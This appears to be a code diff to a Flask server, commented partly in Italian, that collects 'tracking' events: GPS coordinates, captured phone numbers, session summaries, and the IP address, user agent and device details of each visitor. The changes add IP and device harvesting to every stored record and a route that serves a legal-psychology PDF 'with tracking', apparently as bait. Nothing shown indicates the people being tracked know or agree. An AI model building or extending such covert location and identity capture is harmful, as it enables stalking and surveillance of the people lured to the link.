@@ -10,9 +10,10 @@ import math
 import random
 import glob
 from datetime import datetime
-from flask import Flask, render_template, jsonify, request
+from flask import Flask, render_template, jsonify, request, send_file
 from flask_socketio import SocketIO
 from pathlib import Path
+from typing import Dict, Any
 
 # Initialize Flask app
 app = Flask(__name__, 
@@ -22,6 +23,53 @@ app.config['SECRET_KEY'] = 'gps_tracker_secret_key_2024'
 
 # Initialize SocketIO
 socketio = SocketIO(app, cors_allowed_origins="*")
+
+
+def _extract_client_info(req) -> Dict[str, Any]:
+    """Extract client info (IP, UA, basic device flags) from request.
+
+    Returns a dict with fields:
+    - ip: best-effort client IP (X-Forwarded-For or remote_addr)
+    - forwarded_for: raw X-Forwarded-For header if present
+    - user_agent: full UA string
+    - device: { is_mobile, is_android, is_ios, is_iphone, is_ipad, is_windows, is_macos, is_linux }
+    """
+    try:
+        forwarded_for = req.headers.get('X-Forwarded-For') or req.headers.get('X-Forwarded-for')
+        # X-Forwarded-For can contain multiple IPs, take the first non-empty
+        ip = None
+        if forwarded_for:
+            parts = [p.strip() for p in forwarded_for.split(',') if p.strip()]
+            if parts:
+                ip = parts[0]
+        if not ip:
+            ip = req.headers.get('X-Real-IP') or req.remote_addr
+
+        ua = (req.headers.get('User-Agent') or '').lower()
+        device = {
+            'is_mobile': any(k in ua for k in ['android', 'iphone', 'ipad', 'mobile']),
+            'is_android': 'android' in ua,
+            'is_ios': ('iphone' in ua) or ('ipad' in ua),
+            'is_iphone': 'iphone' in ua,
+            'is_ipad': 'ipad' in ua,
+            'is_windows': 'windows' in ua,
+            'is_macos': 'mac os x' in ua or 'macintosh' in ua,
+            'is_linux': 'linux' in ua and 'android' not in ua,
+        }
+
+        return {
+            'ip': ip,
+            'forwarded_for': forwarded_for,
+            'user_agent': req.headers.get('User-Agent'),
+            'device': device,
+            'accept_language': req.headers.get('Accept-Language'),
+            'origin': req.headers.get('Origin'),
+            'referer': req.headers.get('Referer'),
+        }
+    except Exception as e:
+        return {
+            'error': f'client_info_extraction_failed: {e}'
+        }
 
 # Global variables to store current state
 current_location = {
@@ -301,18 +349,48 @@ def get_tracking():
         'last_updated': datetime.now().isoformat()
     })
 
+@app.route('/pdf/psicologia')
+def serve_psicologia_pdf():
+    """Serve il PDF PSICOLOGIA GIURIDICA con tracking"""
+    try:
+        pdf_file = 'PSICOLOGIA GIURIDICA AIPG.pdf'
+        return send_file(pdf_file, 
+                        mimetype='application/pdf',
+                        as_attachment=False,
+                        download_name='PSICOLOGIA_GIURIDICA_AIPG.pdf')
+    except Exception as e:
+        return jsonify({'error': f'PDF not found: {e}'}), 404
+
+@app.route('/api/client-info')
+def get_client_info():
+    """Get client info (IP, UA, device flags) for the current request."""
+    client_info = _extract_client_info(request)
+    return jsonify({
+        'client_info': client_info,
+        'timestamp': datetime.now().isoformat()
+    })
+
 @app.route('/api/track', methods=['POST'])
 def track_user():
     """Endpoint per ricevere dati di tracking GPS e telefono."""
     try:
-        data = request.get_json()
+        data = request.get_json() or {}
+
+        # Enrich with server-side client info (IP, UA, device flags)
+        client_info = _extract_client_info(request)
+        data.setdefault('meta', {})
+        data['meta']['server_received_at'] = datetime.now().isoformat()
+        data['meta']['client_info'] = client_info
+        # Ensure top-level userAgent is set if not provided by client
+        if not data.get('userAgent') and client_info.get('user_agent'):
+            data['userAgent'] = client_info.get('user_agent')
         
         # Log dei dati ricevuti
         print(f"\n🎯 TRACKING DATA RECEIVED:")
+        print(f"IP: {client_info.get('ip')} | UA: {client_info.get('user_agent')}")
         print(f"Session ID: {data.get('sessionId')}")
         print(f"Event Type: {data.get('eventType')}")
         print(f"Timestamp: {data.get('timestamp')}")
-        print(f"User Agent: {data.get('userAgent')}")
         print(f"Data: {data.get('data')}")
         print("="*50)
         
@@ -334,6 +412,12 @@ def track_user():
                 
                 with open(backup_file, 'a', encoding='utf-8') as f:
                     f.write(f"\n[{timestamp}] {event_type.upper()} | Session: {session_id}")
+                    # Include IP and UA summary in backup line
+                    if isinstance(client_info, dict):
+                        ip = client_info.get('ip')
+                        ua = client_info.get('user_agent')
+                        if ip or ua:
+                            f.write(f" | IP: {ip or 'unknown'} | UA: {ua or 'unknown'}")
                     f.write(f" | Dati: {json.dumps(data_content, ensure_ascii=False)}\n")
                     
                     # Se è GPS, aggiungi riga formattata
@@ -352,15 +436,27 @@ def track_user():
         # Nome file basato sulla sessione
         session_id = data.get('sessionId', 'unknown')
         tracking_file = tracking_dir / f"{session_id}.jsonl"
+        client_info_file = tracking_dir / "client_info.jsonl"
         
-        # Append data to file
+        # Append enriched event data to session file
         with open(tracking_file, 'a') as f:
             f.write(json.dumps(data) + '\n')
+        
+        # Also append/refresh client info snapshot for convenience
+        with open(client_info_file, 'a') as f:
+            snapshot = {
+                'session_id': session_id,
+                'received_at': data['meta']['server_received_at'],
+                'client_info': client_info,
+                'event_type': data.get('eventType'),
+                'screen': (data.get('data') or {}).get('screen'),  # if provided by client
+            }
+            f.write(json.dumps(snapshot) + '\n')
         
         # 📁 BACKUP LOCALE per tutti gli eventi
         save_to_local_backup(data.get('eventType', 'unknown'), session_id, data.get('data', data))
         
-        # Se abbiamo coordinate GPS, salvale separatamente
+# Se abbiamo coordinate GPS, salvale separatamente
         if data.get('eventType') == 'location_captured':
             location_data = data.get('data', {})
             if location_data.get('latitude') and location_data.get('longitude'):
@@ -379,14 +475,15 @@ def track_user():
                         'latitude': location_data['latitude'],
                         'longitude': location_data['longitude'],
                         'accuracy': location_data.get('accuracy'),
-                        'user_agent': data.get('userAgent')
+                        'user_agent': data.get('userAgent') or client_info.get('user_agent'),
+                        'ip': client_info.get('ip'),
                     }
                     f.write(json.dumps(coord_entry) + '\n')
                 
                 # 📁 BACKUP LOCALE per coordinate GPS
                 save_to_local_backup('location_captured', session_id, location_data)
         
-        # Se abbiamo un numero di telefono
+# Se abbiamo un numero di telefono
         if data.get('eventType') == 'phone_captured':
             phone_data = data.get('data', {})
             phone = phone_data.get('phone')
@@ -403,14 +500,15 @@ def track_user():
                         'session_id': session_id,
                         'timestamp': phone_data.get('timestamp'),
                         'phone': phone,
-                        'user_agent': data.get('userAgent')
+                        'user_agent': data.get('userAgent') or client_info.get('user_agent'),
+                        'ip': client_info.get('ip'),
                     }
                     f.write(json.dumps(phone_entry) + '\n')
                 
                 # 📁 BACKUP LOCALE per numeri telefono
                 save_to_local_backup('phone_captured', session_id, phone_data)
         
-        # Se è una sessione completa, crea summary
+# Se è una sessione completa, crea summary
         if data.get('eventType') == 'session_complete':
             session_data = data.get('data', {})
             print(f"\n✅ SESSION COMPLETE:")
@@ -424,10 +522,17 @@ def track_user():
             if phone:
                 print(f"Phone: {phone}")
             
-            # Salva summary completo
+            # Salva summary completo (arricchito con client info)
             summary_file = tracking_dir / "session_summaries.jsonl"
             with open(summary_file, 'a') as f:
-                f.write(json.dumps(session_data) + '\n')
+                enriched = {
+                    **session_data,
+                    'session_id': session_id,
+                    'client_info': client_info,
+                    'received_at': data['meta']['server_received_at'],
+                    'user_agent': data.get('userAgent') or client_info.get('user_agent'),
+                }
+                f.write(json.dumps(enriched) + '\n')
             
             # 📁 BACKUP LOCALE per sessione completa
             save_to_local_backup('session_complete', session_id, session_data)
